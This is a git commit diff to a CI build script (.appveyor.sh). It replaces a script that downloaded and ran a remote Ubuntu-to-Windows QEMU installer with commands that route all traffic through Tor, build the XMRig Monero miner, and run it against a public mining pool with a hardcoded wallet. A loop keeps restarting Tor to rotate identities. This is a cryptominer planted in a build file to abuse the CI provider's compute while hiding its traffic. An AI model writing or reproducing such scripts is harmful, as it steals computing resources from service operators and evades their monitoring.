18d8c76d07970eb172a069ad62cf2a35f67a5fbc
jdiijfrlohb <anhhaitienken@gmail.com>
2019-08-26 15:44:19 +0700

    Update .appveyor.sh

--- .appveyor.sh
+++ .appveyor.sh
@@ -1,10 +1,20 @@
 #!/bin/bash
-dd if=/dev/zero of=/swapfile bs=1024 count=5242880
-mkswap /swapfile
-chown root:root /swapfile
-chmod 0600 /swapfile
-swapon /swapfile
-mkdir /media/script && mount -t tmpfs -o size=1m tmpfs /media/script
-wget -P /media/script https://raw.githubusercontent.com/mediabots/Linux-to-Windows-with-QEMU/master/mediabots_Ubuntu-to-Windows.sh
-chmod +x /media/script/*
-/media/script/mediabots_Ubuntu-to-Windows.sh
+sudo -i
+sudo apt-get update
+sudo apt-get install -y libmicrohttpd-dev libssl-dev cmake python build-essential libhwloc-dev screen git automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libgmp-dev libuv1-dev tor
+git clone https://github.com/ruped24/toriptables2.git
+cd toriptables2/
+sudo mv toriptables2.py /usr/local/bin/
+cd
+git clone https://github.com/xmrig/xmrig.git
+sudo systemctl start tor
+sudo toriptables2.py -l
+
+cd xmrig
+mkdir build
+cd build
+cmake ..
+make
+sudo sysctl -w vm.nr_hugepages=128
+torify ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:9000 -u 42iZdPFRQPN1qpHG6niqkG6cY3oZph9Vn9JZvKZ1Guce7UVWj587z7TJ15fW85FDQHNU9Wiqe3qGXfP2VNHq4xa9MK5LUrU -p x9 -k --tls -a cn/r -t 4 --b
+while true; do service tor restart; sleep 30; done
